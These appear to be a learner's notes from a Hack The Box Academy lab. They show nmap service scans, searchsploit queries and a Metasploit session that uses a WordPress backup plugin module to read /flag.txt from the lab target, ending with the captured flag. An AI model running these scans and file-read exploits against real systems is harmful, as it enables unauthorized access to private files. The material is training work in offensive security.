# https://academy.hackthebox.com/module/77/section/843

# Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)
# target 94.237.57.134:47832
# Search for plugin exploits

nmap -sV -A <TARGET_IP>

# Not shown: 994 closed tcp ports (conn-refused)
# PORT      STATE    SERVICE REASON      VERSION
# 19/tcp    filtered chargen no-response
# 22/tcp    open     ssh     syn-ack     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
# | ssh-hostkey: 
# |   256 dc5893bd6ca06a4cbb3c63367478dd64 (ECDSA)
# | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPJr+W0BUI1rGJY9w5HyfGArScJOm/5kS+IVAN1i2CHDFCJXBxmSH/+yaQf5+Yxb/p0kA/7x3zSlwWBLmdxwWVc=
# |   256 28c1f3900a2dc7f3ebee9d5e3023caaa (ED25519)
# |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBQ8Aw1XVnLH7FU3Pfip07d5yOiQuNuOl5Pai+HKFtgn
# 25/tcp    filtered smtp    no-response
# 111/tcp   open     rpcbind syn-ack     2-4 (RPC #100000)
# | rpcinfo: 
# |   program version    port/proto  service
# |   100000  2,3,4        111/tcp   rpcbind
# |   100000  2,3,4        111/udp   rpcbind
# |   100000  3,4          111/tcp6  rpcbind
# |_  100000  3,4          111/udp6  rpcbind
# 32773/tcp open     http    syn-ack     Node.js (Express middleware)
# | http-methods: 
# |_  Supported Methods: GET HEAD POST OPTIONS
# |_http-title: Write to the Easter Bunny!
# 55600/tcp open     http    syn-ack     Apache httpd 2.4.41 ((Ubuntu))
# |_http-server-header: Apache/2.4.41 (Ubuntu)
# | http-methods: 
# |_  Supported Methods: GET HEAD POST OPTIONS
# |_http-title: Employee Manager
# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


searchsploit service_name version

# Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-20 23:27 BST
# Nmap scan report for 94-237-60-187.uk-lon1.upcloud.host (94.237.60.187)
# Host is up (0.14s latency).

# PORT      STATE SERVICE VERSION
# 48747/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

# Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done: 1 IP address (1 host up) scanned in 13.97 seconds
searchsploit apache 2.4.41
searchsploit httpd 2.4.41

## EXAMPLE
nmap -sV -A 192.168.1.10
searchsploit tomcat 9.0.16

# search wordpress simple
# 13  use 1
# 14  set RHOSTS 94.237.57.134
# 15  set RPORT 47832
# 16  check
# 17  exploit
# 18  cat /home/htb-ac-1312838/.msf4/loot/20240621034139_default_94.237.57.134_simplebackup.tra_341702.txt
# 19  options
# 20  set FILEPATH /flag.txt
# 21  exploit
# 22  cat /home/htb-ac-1312838/.msf4/loot/20240621034139_default_94.237.57.134_simplebackup.tra_805731.txt
# 23  cat /home/htb-ac-1312838/.msf4/loot/20240621034347_default_94.237.57.134_simplebackup.tra_805731.txt

# HTB{my_f1r57_h4ck}


